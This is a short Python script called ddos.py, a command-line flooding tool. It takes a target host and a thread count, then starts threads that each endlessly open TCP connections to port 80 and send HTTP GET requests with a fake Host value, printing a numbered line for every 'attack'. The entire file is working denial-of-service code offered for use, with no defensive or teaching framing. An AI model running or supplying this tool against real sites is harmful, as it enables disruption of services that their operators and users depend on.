import socket, threading, sys
from colorama import Fore

try:
	target = sys.argv[1]
	count = int(sys.argv[2])
except:
	print(f"{Fore.RED}Error!{Fore.RESET}")
	print(f"{Fore.CYAN}Using: {Fore.GREEN}ddos.py [TARGET] [COUNT]{Fore.RESET}")
	print(f"{Fore.CYAN}Example: {Fore.GREEN}ddos.py example.com 500{Fore.RESET}")
	sys.exit(1)
fake_ip = '182.21.20.32'
port = 80
attack_num = 0

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
        global attack_num
        attack_num += 1
        print(f"{Fore.YELLOW}Attack №{attack_num}!{Fore.RESET}")
        
        s.close()

if __name__ == '__main__':
	print(f"Starting to DDoS {Fore.RED}{target}{Fore.RESET}!")
	for i in range(count):
		try:
		    thread = threading.Thread(target=attack)
		    thread.start()
		except:
			print(f"{Fore.RED}Error №{attack_num}!{Fore.RESET}")
			continue
